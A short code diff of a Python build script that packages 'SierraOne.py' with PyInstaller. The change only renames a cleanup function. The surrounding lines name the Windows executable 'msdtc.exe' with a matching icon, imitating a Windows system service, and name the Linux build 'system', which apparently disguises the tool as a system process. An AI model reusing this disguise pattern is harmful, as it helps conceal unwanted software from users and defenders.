@@ -7,7 +7,7 @@ import time
 from shutil import rmtree
 
 
-def remove_files():
+def remove_junk():
     os.remove("msdtc.exe.spec")
     rmtree("build")
     rmtree("__pycache__")
@@ -16,7 +16,7 @@ def builder(dist):
     if dist.lower() == "windows":
         subprocess.run(["wine", "pyinstaller", "--onefile", "--icon=images/msdtc.ico", "-n", "msdtc.exe", "SierraOne.py"])
         time.sleep(1)
-        remove_files()
+        remove_junk()
         #subprocess.run(["rm", "-rf", "build", "__pycache__", "msdtc.exe.spec"])
         print("\nDone. Check 'dist' for your file")
         sys.exit(0)
@@ -24,7 +24,7 @@ def builder(dist):
     elif dist.lower() == "linux":
         subprocess.run(["pyinstaller", "--onefile", "-n", "system", "SierraOne.py"])
         time.sleep(1)
-        remove_files()
+        remove_junk()
         #subprocess.run(["rm", "-rf", "build", "__pycache__", "system.spec"])
         print("\nDone. Check 'dist' for your file")
         sys.exit(0)
